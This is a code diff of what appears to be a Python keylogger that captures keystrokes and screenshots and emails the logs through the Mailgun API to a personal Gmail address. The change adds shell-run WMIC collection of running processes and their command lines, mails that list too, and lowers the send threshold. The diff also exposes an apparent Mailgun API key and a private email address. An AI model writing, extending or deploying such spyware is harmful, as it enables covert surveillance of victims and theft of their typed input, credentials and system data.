@@ -2,8 +2,8 @@ import keyboard
 import requests
 import datetime
 import time
-#import conversion
 import pyscreenshot as ImageGrab
+import subprocess
 
 def screenShot():
     # fullscreen
@@ -54,12 +54,19 @@ def send_LOG():
     return requests.post(
         "https://api.mailgun.net/v3/mg.ladmail.com/messages",
         auth=("api", "key-a65a55fe6f78da49a3addfd94fa83b87"),
-        files=[("attachment", open("LOG.txt"))],
-        data={"from": "LOGFILEMANAGER <postmaster@mg.ladmail.com>",
+        files=[("attachment", open("Process_list.txt"))],
+        data={"from": "PSLOGFILEMANAGER <postmaster@mg.ladmail.com>",
               "to": "lad <hth225@gmail.com>",
-              "subject": "Hello lad, Here is captured Logfile",
-              "text": "CAPTURED LOGFILE"
+              "subject": "Hello lad, Here is captured Process Logfile",
+              "text": "CAPTURED PROCESS LOGFILE"
               })
+
+def parse_process_list():
+    cmd = 'WMIC PROCESS get Caption,Commandline,Processid'
+    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
+    file = open("Process_list.txt", "w")
+    for line in proc.stdout:
+        file.write(str(line))
 
 if __name__ == "__main__":
 
@@ -78,17 +85,9 @@ if __name__ == "__main__":
          with open('LOG.txt') as f:
              count = (sum(1 for _ in f))
 
-         if (count >= 150):
+         if (count >= 20):
+            parse_process_list()
             send_simple_message(file_content)
             send_LOG()
             print("done")
             file_flush()
-
-     # if (status.tm_min == 55 ):
-     #     if(status.tm_sec == 30):
-     #        f = open("LOG.txt", 'r')
-     #        file_content = f.read()
-     #        f.close()
-     #        send_simple_message(file_content)
-     #        print ("done")
-     #        file_flush()
